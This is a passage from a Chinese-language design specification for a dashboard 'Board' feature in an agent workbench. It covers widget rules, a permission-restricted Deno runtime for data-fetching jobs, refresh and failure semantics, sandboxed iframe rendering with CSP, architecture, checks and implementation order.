13. 不许把元素 append 进自己的后代（Kimi 反复强调，说明模型常犯，后果是 DOM 无限增长）。
14. 不要监听 `wheel` 并 `preventDefault`（会打断 §4.6 的转发）。
15. 必须调用 `widget.ready()`。

### 6.5 作业写作规范（7 条）

1. 单文件、**零依赖**，导出 `run(ctx)`；不得 `import` 任何模块——`--no-remote --cached-only` 把 import 图这条绕权限的洞封死了，这是硬约束不是建议。
2. 用全局 `fetch`；所有要访问的主机必须在 `allowedHosts` 显式声明，未声明会被 Deno 权限层直接拒。
3. 只能读写 `ctx.runDir`；碰不到工作区，也碰不到自己的代码。
4. 返回可 JSON 序列化对象，**硬顶 512 KiB**；聚合/裁剪在作业里做，不要原样回传上游响应。
5. 首版只支持公开端点：不要写死密钥，也读不到环境变量（未给 `--allow-env`）。
6. 60 s 超时（硬顶 120 s）：不要重试风暴、不要长轮询。
7. **幂等**：审批一次之后可被重复静默执行，作业不得有副作用。

### 6.6 同源约束（工程要求）

规范条目与 `board_widget_finish` 校验器**必须同源**，否则 agent 会被反复拒且不知为何（错误只回定位信息）。落法：规则表写成一份数据常量（id / 规则 / 检查方式 / 违反表现），校验器由它生成，SKILL.md 的规则章节由它生成或由测试断言两者条目一致；**示例 widget 必须通过校验器**（测试里跑）。于是「示例板内容 / prompt 示例 / 校验器测试样本」收敛成同一批文件。

### 6.7 SKILL.md 结构

```text
bundled-skills/board-widget/
  SKILL.md                     流程 + 硬规则摘要 + 何时该建取数作业
  references/widget-sdk.md     SDK 逐方法 + 消息时序（含「init 之后才执行主体」）
  references/widget-rules.md   §6.4 全文，每条附违反时的表现
  references/job-runtime.md    §6.5 全文 + Deno 权限后果
  references/examples/         番茄钟（纯本地交互）、汇率（数据驱动）两个完整样本
```

frontmatter 照既有 bundled skill：`name` / `description` / `version` / `tags`。

## 7. Normative: 取数作业运行时（详见 ADR-0023）

### 7.1 执行形态：Deno 子进程

在「声明式网络白名单」这一维上 Deno 是**唯一**可用候选：`--allow-net` 接受主机名/IP、可带端口、支持子域通配，默认连 DNS 解析都要权限。对照组全灭——Node 的 host 级 `--allow-net` 要 v25（宿主是 v24.6.0，flag 根本不存在）；`sandbox-exec` 网络只有 `(allow network*)` 一个布尔。

**首版依赖宿主已安装的 Deno**，侧车启动时探测，缺失则作业能力整体不可用并给出明确错误（不静默降级、不偷偷改用别的执行器）。随包分发推后到桌面打包阶段。

### 7.2 命令行形状（权限即合同）

```
deno run \
  --no-remote --cached-only \
  --allow-net=<approved.allowedHosts 逐项展开> \
  --allow-read=<runDir> --allow-write=<runDir> \
  --no-prompt \
  <runnerPath> <jobId> <runId>
```

- **`--no-remote` 是必需项，不是加固**：Deno 的**初始静态 import 图不过权限系统**，那是这套权限模型唯一的洞。代价是作业代码必须零依赖单文件。
- **绝不给** `--allow-run`、`--allow-ffi`（二者等同 `--allow-all`）、`--allow-env`、`--allow-sys`。
- `--allow-net` 取自 **`approved.allowedHosts`**，不取 `pendingChange`。
- `--no-prompt` 保证权限不足时直接失败，而不是挂在交互提示上等到超时。
- **不叠加 `sandbox-exec`**：本仓当前 profile 实际等于「读全盘 + 仅工作区可写 + 自由 spawn + 网络全开」，叠上去对 Deno 权限模型**一项都不增强**，只增加一层难以推理的语义。

### 7.3 落盘位置（结构性封死自我改写）

作业代码在**工作区之外**：`~/.uilab/runtime/board-jobs/<jobId>/job.ts`，权限 0600。运行目录另开 `.../runs/<runId>/`，**只有它**被授予读写。于是作业**物理上碰不到自己的代码**——`approved.codeHash` 的执行前校验退化为第二道闸（defense in depth）而非唯一防线。既有先例：AuthBinding 落在 `~/.uilab/runtime/`，0600 + 文件锁 + 原子写，且硬性拒绝放在 `WORKSPACE_ROOT` 内。这也顺带避开了「dev 下工作区根回退到 monorepo 根」的问题。

**权威永远是渲染层 IDB**（`widgetDataJobs.approved`）。侧车磁盘上的代码是**派生副本 / 已安装态**；二者不一致时以 IDB 为准，渲染层可经普通 HTTP 端点**重新安装**。不允许任何读路径把侧车磁盘当权威。

### 7.4 入口约定

```ts
interface JobContext {
  runId: string
  jobId: string
  now: Date          // 由 runner 注入，便于测试与时区确定性
  timeZone: string
  runDir: string     // 唯一可写目录
}
// 作业导出：export async function run(ctx: JobContext): Promise<unknown>
```

runner import 作业模块并调用 `run(ctx)`；**顶层脚本不是入口**。返回值即产物。**不提供 `ctx.fetch` 包装**——约束已由 `--allow-net` 在进程层强制，再包一层只会给人「绕过包装就能出网」的错觉。

### 7.5 超时、配额、产物

- 默认超时 **60 s**，单 job 可配 `timeoutMs`，**硬上限 120 s**；超时即强杀（未给 `--allow-run`，作业无法 spawn 子进程，所以进程树就是它自己）。
- 内存 / CPU 上限首版不设（列入未验证）。
- **端点直接回传产物，硬顶 512 KiB**，首版不走 `GET /workspace/file`（其有效上限被渲染层 Document adapter 压到 1.5 MiB，要吃满得自建 adapter；而执行端点本来就是我们自己的，直接回传更短一条链路）。
- 产物必须可 JSON 序列化，超限即 run 失败并明确指出体积。
- **产物 schema 校验放在渲染层写库前**（board module application 层），不放侧车——侧车不该持有 widget 的数据契约。

### 7.6 执行入口与授权

- **端点不注册为 tool。** 反例证据：VoltAgent 自带的 `POST /tools/:name/execute` 不走 agent loop 却仍会撞 `missing_task_context`，因为它调的是被 wrap 过的 `tool.execute`——**决定因素是「走不走 tool 注册」，不是「走不走 agent loop」**。挂载点：`configure-sidecar-app.ts` 加一个 `mountBoardJobRoutes`。
- 端点**不接受任意 argv**：入参只有 `jobId`，代码与权限全部来自侧车侧的已安装态（由 IDB 权威派生）。
- **授权发生在创建 / 修改作业代码的那个 Task 的 Turn 内**，复用既有 `approval.requested` 链路。运行期端点只校验「存在 `approved` 且待跑代码哈希匹配」，**不请求审批**。
- fail-closed 的开口只在这个新入口，**不动** `decideToolNeedsApproval`（那是按工具名的 MCP 轴，放宽会让运维 env 意外获得放行产品级作业的能力），**不动** `execute_command`（违反 ADR-0017）。
- 首版**不调 Connector 工具**——这也是「刷新不需要 Task」得以成立的前提（调 Connector 才需要 `taskId`）。

## 8. Normative: 刷新与执行语义

### 8.1 四条触发面，收敛同一链路

| 触发面 | 发起者 | 差异 |
|---|---|---|
| widget 头部刷新（宿主 chrome） | 渲染层 | 单个 job |
| Board 级「全部刷新」 | 渲染层 | 遍历该板有作业的 widget，**并发上限 2**，其余排队，跳过正在运行的 |
| widget 内 `widget.submit(payload)` | 桥 → 渲染层 | 同一端点，带 payload |
| **首跑** | 渲染层，在 `board_commit` 成功后自动执行一次 | 不由 agent 触发 |

**并发上限 2**：每次执行是一个 Deno 子进程，20 块 widget 全刷会同时开 20 个进程，而我们尚未设内存 / CPU 上限。

**首跑由渲染层做**：执行作业是 HTTP 动作**不是工具**，让 agent 触发首跑就要再开第三个 client-side tool；而渲染层在 commit 成功后自动首跑是零新增（它本来就在那个位置，§9.4 的自动打开预览也在同一处）。

### 8.2 异步 + 轮询

```
POST /board/jobs/:jobId/run        → 立即返回 { runId }
GET  /board/runs/:runId            → 轮询（1 s 间隔）
POST /board/runs/:runId/cancel     → 取消
```

**为什么不同步等**：状态机里有 `cancelled`，同步等待没有取消的着力点；且超时硬顶 120 s，一个挂 120 秒的 fetch 经 dev server 代理的行为是不确定的。

### 8.3 不重入与状态单一来源

- 同一 `jobId` 已在运行 → 端点返回 **`already_running`**，渲染层**不排队**，刷新按钮显示运行中禁用态。
- 发起执行时，渲染层在**同一个 IDB 事务**里新建一条 `running` run 记录并把 `widget.status` 置 `running`；轮询到终态时同样在一个事务里更新两者（成功才写 `latestData`）。**不允许两个来源各自维护状态**，否则必然出现「widget 显示完成、记录还在转」这类不一致。
- **loading 是宿主 chrome 画的，不是 widget 画的**；列表页缩略图同样显示真实运行态。
- 侧车重启后遗留的 `running` run 记录，渲染层读取时判定为 `error`（无进程可续），不留悬挂态。

### 8.4 失败语义：旧数据继续显示，错误只落在 chrome 上

失败 / 超时 / 取消**天然不覆盖上次成功数据**（§1.3 结构保证）。**UI 规则**：失败后 widget **继续显示上一次的成功数据**，错误标记只出现在宿主 chrome 上（角标 + hover 说明最近一次失败原因）。

这是「没有启停概念时失败态怎么表达才不误导」的答案：**不误导的做法是不要让 widget 变空白。** 一块显示着昨天数据、角上标着「上次更新失败」的 widget 是诚实的；一块空白 widget 是在撒谎说没有数据。

**无侧车 / 未装 Deno**：按 ADR-0018 诚实报错。刷新按钮**保持可点**，点击后给出明确原因（「未检测到本机运行时」/「未安装 Deno，无法执行取数作业」）；启动探测已知不可用时 chrome 常驻提示图标。**不得把按钮做成灰的且什么也不说**——那违反 Workbench `AGENTS.md` 硬规则 12。

### 8.5 取消与输入解析

- 取消 → 强杀进程；run 终态 `cancelled`，`widget.status` 回 **`idle`**（不是 `error`——用户主动取消不是故障），`latestData` 不动。
- 输入解析只做两层：**`submit` 的 payload → widget 的 `saveInput` 草稿**。第三层（job 的 `defaultInput`）首版不做——作业模型里没有输入声明字段，凭空加一层解析顺序而没有产生它的地方，是给未来添乱。

## 9. Product surface

### 9.1 导航

`activeDestination` 扩成判别联合，**不加 TanStack Router 路由**：

```ts
type Destination =
  | { kind: 'task' }
  | { kind: 'capabilities' }
  | { kind: 'board'; boardId?: string }   // 无 boardId = 列表页
```

理由是一致性而非省事：**主实体 Task 自身都不在 URL 里**，只给 Board 开一条 URL 会造出两套并存的导航模型；Electron 是单窗口无地址栏，深链接目前没有消费者。若日后要深链接，正确形态是**Task 与 Board 一起进 Router**。

**工程要求**：Shell 里现有的 `activeDestination === 'capabilities'` 判断（drawer 宽度、`aria-hidden`、`WorkSurfaceHost.visible`、`fullStage` 共五处）须改写成 **`kind !== 'task'`**，否则每加一个 destination 都要回来改这五处，漏改的表现是「打开看板时 Work Surface 抽屉还占着宽度」这类难查的几何 bug。

- Navigator 的「看板」是**单入口**（`NAV_ITEMS` 已有 `board` 占位项），点进列表页；**不在 Navigator 展开列出各块板**（会与「任务」争夺垂直空间，而**列表页的实时缩略图本身就是比文字列表更好的选择器**）。
- 详情页用 **`看板 > <板名>` 面包屑**；Navigator 的「看板」项在列表页与详情页**都保持选中态**。
- Board 占满 stage，`drawerWidth = 0`，`WorkSurfaceHost` 不可见（照 Capabilities 先例）。
- 详情页提供「回到生成它的对话」（数据来自 `createdByTaskId`）；Task 已删时**不显示该入口**，不报错、不留死链。
- **不持久化停留位置**：`SessionPointerRecord` 不加 destination 字段，冷启动一律回 Task。本仓冷启动原则是 Composer-first，且 Capabilities 也不持久化；Board 是「去逛的地方」，不是「干活的地方」。

### 9.2 三处复用同一套渲染

- **`BoardCanvas`（共用）**：网格布局 + widget 宿主 chrome。
- **外层各自提供**：`BoardDetailPage` 给面包屑与页级操作；预览面板给关闭 / 全屏。
- **`BoardWidgetHost`（iframe + chrome + 桥）必须是独立组件，不得耦合网格。** 这是三处复用的共同前提，也是「Timeline 内联单个 widget」不被做死的**唯一条件**。

原型验证了复用成立，靠两条：**网格不认识 widget**（`renderItem(id)` 由调用方决定画什么，所以灰色占位格与活 widget 能进同一个网格）；**拖拽把手是属性契约** `data-board-drag-handle` 而非 prop 穿透（宿主离开网格仍可用，网格装非 widget 仍可用）。

**列表页缩略图**：真 iframe 渲染是默认，不需要降级（实测 4 / 8 / 20 个 iframe 墙钟 68 / 86 / 127 ms，曲线次线性，瓶颈在 widget 自己的脚本而非 iframe 创建）。只渲**前 4 个**，不足补灰色占位格。**必须按 1/scale 渲染再 `transform: scale(0.34)`**——widget 是不透明源，宿主改不了它内部样式，直接塞小格子只会裁掉内容。`static` 降级保留为开关，判据写进测试（列表页墙钟 > 5000 ms 则切）。

**拖拽**：**不做重力压缩**（gravity-up 会让「拖到看板底部」弹回顶部），改成被拖者钉住、只级联下推真正重叠者；被拖 widget 像素级跟手 + 另画虚线吸附框（44 px 行高下按格跳动会被读成卡顿）。**预览里布局只读**，拖拽只在详情页（预览宽度窄，同一块板在窄宽下拖出的位置换到详情页会显得错乱）。

**「全屏」是单 widget 放大**，会让同一 widget id 同时存在两个活实例，沙箱与桥已验证可容忍。

### 9.3 widget chrome

宿主绘制：刷新、全屏、更多。「更多 → 取数作业」弹窗**必须**显示作业标题/说明、**「已授权运行」状态与撤销入口**（这是 `full-access` 预设下用户唯一能看见并撤回作业授权的地方，§5.4）、以及最近一次运行的时间与结果。Kimi 那套「启停开关 + 近期运行记录列表」首版不做（无启停概念）；run 记录仍存 10 条，日后加 UI 不需改 schema。

### 9.4 会话内预览

复用现有 in-memory Surface Registry 与 `openWorkSurfaceTab`，注册一个 Board Surface，**零新通道**。题面担心的错配（Board 全局，而 Work Surface tab 状态存在 `workbench-session` 的 per-Task 布局里）**实际不存在**——tab 里存的是一个**引用**（`boardId`），不是 Board 实体本身；「这个对话里我正在看哪块板」本就是 per-Task 的合理状态。

由**渲染层在 `board_commit` 成功后打开**，不走 agent 主动打开（`work_surface.open_requested` 那条通道已被证伪：侧车零命中，唯一生产者是测试专用的 `ScriptedRuntimePort`）。`board_commit` 本来就在渲染层执行，它就是「知道刚刚落库了什么」的那个地方。

- 一个 Turn 内**首次** commit 成功 → 自动打开并定位到该 Board。
- 同 Turn 内后续 commit **不重复打开**，只更新已打开的预览。
- **用户手动关闭后，同一 Turn 内不再自动弹回**——否则 agent 连写 8 个 widget 会把面板反复怼回用户脸上。

### 9.5 示例 Board

**一律零作业。** 空态的职责是**保证有货可看**，不能建立在「侧车可达 + 已装 Deno」这两个可能不成立的前提上；Kimi 自己的示例板也是零作业。

- **「上手指引」（5 个 widget）**：纯本地交互，演示的都是我们**真实具备**的能力——拖一拖/拉一拉调尺寸、点击计数器、待办清单（演示 `saveInput`）、主题跟随（演示 `onThemeChange`）、一张「怎么用对话创建自己的组件」引导卡。
- **「示例：每日速递」（3 个 widget）**：数据预填在 `latestData`，chrome 上标注**「示例数据 · 未绑定取数作业」**并给转化引导「想让它每天自动更新？在对话里说一声」。它让用户看见数据型 widget 长什么样，同时**不撒谎**。

**同构落库**而非只读常量——教程板**必须可拖**，否则它教不了拖拽。`isExample: true` + `presetId` / `presetVersion`；列表页与详情页带「示例」角标；widget HTML 作为源码常量放 `modules/board/fixtures/`。**可直接改、可删**，因此**不做「做同款」**（Kimi 需要它是因为其示例结构性只读；我们的示例可改，该前提不存在，而「照示例做一个我的」的自然路径就是对话主线）。

**首装时机与幂等**：首次进入 Board 列表页时**懒安装**（冷启动不该为一个用户可能根本不去的区域付成本）。幂等记录用现有 `metadata` store（`board.presets.installed = { [presetId]: version }`——**这是该 store 的第一个消费者**），语义必须是「**曾经安装过**」而非「当前是否存在」，否则示例删不掉。**preset 版本升级不覆盖已安装的示例**（用户可能已改过）；要让老用户看到新内容就**新增一块**（新 `presetId`），不是升级旧的。计入每板 widget 上限。

## 10. Architecture

### 10.1 模块

新增 Deep Module **`archetypes/agent-workbench/src/modules/board`**，只经 `@/modules/board` 的根 `index.ts` 对外。

```text
modules/board/
  model/            grid 数学、实体类型、srcdoc 组装、drag-handle 契约、相对时间
  application/      command 路径（上限校验、原子提交、产物 schema 校验、run 状态机）
  ports/            BoardStorePort、BoardJobRuntimePort、BoardContentPort（module 自己拥有）
  adapters/         IDB store、侧车 HTTP（run / 拉取内容 / 重新安装）
  fixtures/         示例 Board 与 widget HTML 源码常量
  ui/               BoardWidgetHost、BoardCanvas、列表页、详情页、预览面板
```

- **port 必须归 board module 拥有**，不得建全局 `shared/` / `common/` / `ports/`（门禁已有检查）。
- 渲染层已有三个模块在做「不经 Runtime 直接调侧车 HTTP」（`work-surface` 的 `DocumentContentPort`、`capabilities` 的 `CapabilitySnapshotPort`、`project` 的 `sidecar-workspace-ready`），board 是第四个，形态照抄。

### 10.2 侧车

- 新增 board 工具族（6 个侧车侧 + 2 个 client-side 声明）。client-side 的两个照 `ask_user_question` 先例注册（**无 `execute`、无 `needsApproval`** 正是 client-side tool 的标记方式）。
- 新增 `mountBoardJobRoutes`：`POST /board/jobs/:jobId/run`、`GET /board/runs/:runId`、`POST /board/runs/:runId/cancel`、内容拉取与重新安装端点。
- 新增 `bundled-skills/board-widget/`。
- `create-agent.ts`：instructions 加 3 句；`tools:` 按 `selectedFeatureIds` 追加 board 工具；`board_job_finish` 配 `needsApproval: true`。
- `capability/turn-context.ts`：加 `capabilityFeatureIds` context key。

### 10.3 门禁（`pnpm check:workbench` 新增）

1. `index.html` 必须含 CSP meta，且必须包含 `frame-src` 与 `img-src`、不得包含 `'unsafe-eval'`。
2. Board widget 渲染点的 iframe 必须**同时**具备 `sandbox` 与 `csp` 属性；`sandbox` 不得含 `allow-same-origin`。
3. **成对检查**：宿主 CSP 的授予集必须覆盖 widget `csp=` 所需（因子文档只能加严）——这是本特性最主要的回归风险：后人收紧宿主会让全部看板静默黑屏。
4. 禁止 board module 引用 `url-utils.ts` 的 `sandboxForTrust()`。
5. board module 不得被其它模块的内部文件直接 import（既有 module 边界检查自然覆盖）。

## 11. Definition of Done

- `pnpm typecheck` / `pnpm build` / `pnpm test` / `pnpm check:workbench` 全绿，门禁含 §10.3 五条新检查。
- 无侧车路径下：看板列表、详情、拖拽、示例板、`saveInput` 全部可用；刷新按钮可点并给出诚实原因。
- 有侧车 + 有 Deno：对话创建一块含取数作业的 Board 全流程通过，含审批卡文案、首跑、失败态、取消。
- 有侧车 + 无 Deno：作业能力明确不可用且原因可见，其余功能不受影响。
- 示例 widget 全部通过 `board_widget_finish` 校验器（§6.6 同源约束的回归测试）。
- 中断恢复：写到一半刷新页面后，`board_status` 能如实回答并续写。
- 删 Task 不影响 Board；删 Board / widget / job 的级联符合 §1.6。

## 12. 实施顺序与前置依赖

**#124 事件协议 v2 先落地**，Board 排在其后。三条具体约束：

1. Board 的 IDB store 在 v2 完成 bump **之后**再加版本（v3），不与 v2 的清库跃迁混在一次。
2. Board **不产生事件**（§5.8），所以不需要遵守 v2 的事件命名——但也**不得**依赖 v2 已删除的 `run.*` 与 `runId`。本规格全文用 Turn 而非 Run 描述边界。
3. 末端实施 ticket 的切分待 #124 结论落地后进行，每张必须在正文写明这条前置依赖。

建议实施顺序：模块骨架 + 门禁 → IDB v3 迁移 → CSP + 沙箱与桥（原型代码回流）→ 侧车工具族与 staging → client-side commit 与拉取 → 作业运行时 → 刷新语义 → 列表/详情/预览 UI → 示例板 → agent 面契约（skill + instructions）。

## 13. 已知弱化（accepted，不是待办）

- **静态打包下 nonce 退化为构建期常量**：本机桌面应用，宿主侧无渲染不可信 HTML 的路径，接受。
- **`full-access` 预设下作业授权卡不出现**：与 `execute_command` 同等待遇，是用户显式选择的档位；靠 §9.3 的撤销入口兜底。
- **`board_commit` 不受 Permission Preset 管控**：client-side tool 与 preset 在策略层刻意隔离，如实记录而不假装受管。
- **`board-widget` skill 在无 board 工具的 Task 里仍占 `workspace_list_skills` 一个名额**：靠 §6.1 Layer C 第三句兜住。
- **首版依赖宿主已装 Deno**：装了 Workbench 但没装 Deno 的用户看不到作业能力。
- **widget 可覆盖宿主注入的 token 变量**：首版接受。

## 14. Open items for implementation tickets

按主题归拢；完整雾区清单在地图 #111。

**需实测校准的参数**：单片 2–4 KB（推算值）、staging TTL、心跳 5 s/3 次与 ready 8 s/2 次、轮询 1 s 与并发上限 2、自修上限 3 次、产物 512 KiB、Deno 启动耗时。

**需实测确认的行为**：`frame-src 'self'` 对 `about:srcdoc` 初始加载与自导航的判定（**自导航封堵是否成立的唯一支点**）、`csp=` 属性对本规格全部指令集的生效性、srcdoc 的进程模型（决定要不要看门狗）、WebSocket 在不透明源下能否连通、`--allow-net` 的子域通配是否覆盖裸域及对重定向/IP 直连的判定、prod 期 `style-src` 能否收紧到 `'self'`、Windows 下 Deno 权限与路径。

**需产品判断**：会话内预览面板的宽度与列数（实测 380 px + 12 列会挤压 widget 内容，三个方向待选：加宽到 480–560 px、预览改 6 列重排、或整体缩放）；主题 CSS 变量的命名与数量（对齐 Foundation token 还是自成小集合）；20 块 widget 全刷是否需要整体进度条；轮询在后台/最小化时的退避。

**未测的成本面**：真实 agent 生成的重 widget（图表、大量 DOM）渲染成本与内存；数十个 widget HTML 与产物入库后的 IDB 配额；SKILL.md 正文长度与一次写对率的关系、`references/` 分册是否被跳读；8 个工具对模型可靠性的影响；CSP 违规静态检测的漏报率。

## Out of scope（重申）

定时调度与启停 UI、需认证的数据源与用户密钥、Connector 工具调用、Timeline 内联 widget、批注模式、「整理」自动布局、「做同款」、固定至桌面、导出/导入/跨设备同步、Board 绑定到 Project、widget 版本历史与回滚、同一 widget 放置多块板、SDK `files` 与 `allow-downloads`、agent 删除能力、Workbench 派生应用生成（Phase 8）。

## Resolution trail

| Ticket | 主题 |
|---|---|
| [#112](https://github.com/xiaowen-0725/uilab-admin/issues/112) | 调研：srcdoc 不透明源沙箱的真实约束 |
| [#113](https://github.com/xiaowen-0725/uilab-admin/issues/113) | 调研：client-side tool 承载 Board 变更的上限 |
| [#114](https://github.com/xiaowen-0725/uilab-admin/issues/114) | 调研：侧车执行取数作业的可用路径 |
| [#115](https://github.com/xiaowen-0725/uilab-admin/issues/115) | 三实体领域模型与 IDB schema |
| [#116](https://github.com/xiaowen-0725/uilab-admin/issues/116) | 写入通道（方案 D：控制面/内容面分离） |
| [#117](https://github.com/xiaowen-0725/uilab-admin/issues/117) | srcdoc 交付与宿主桥协议 |
| [#118](https://github.com/xiaowen-0725/uilab-admin/issues/118) | Shell 导航落点与会话内预览 |
| [#119](https://github.com/xiaowen-0725/uilab-admin/issues/119) | 侧车 board 工具族合同 |
| [#120](https://github.com/xiaowen-0725/uilab-admin/issues/120) | 刷新与执行/状态语义 |
| [#121](https://github.com/xiaowen-0725/uilab-admin/issues/121) | 原型：列表页与详情页（含缩略图成本实测） |
| [#122](https://github.com/xiaowen-0725/uilab-admin/issues/122) | 内置示例 Board |
| [#125](https://github.com/xiaowen-0725/uilab-admin/issues/125) | 应用 CSP 与 widget 子文档策略强制 |
| [#126](https://github.com/xiaowen-0725/uilab-admin/issues/126) | 运行归属（全局 Board vs task-scoped Runtime） |
| [#127](https://github.com/xiaowen-0725/uilab-admin/issues/127) | 调研：作业运行时可选方案 |
| [#128](https://github.com/xiaowen-0725/uilab-admin/issues/128) | 作业运行时规格 |
| [#132](https://github.com/xiaowen-0725/uilab-admin/issues/132) | agent 面契约（能力说明 / 写作规范 / schema 与错误码） |
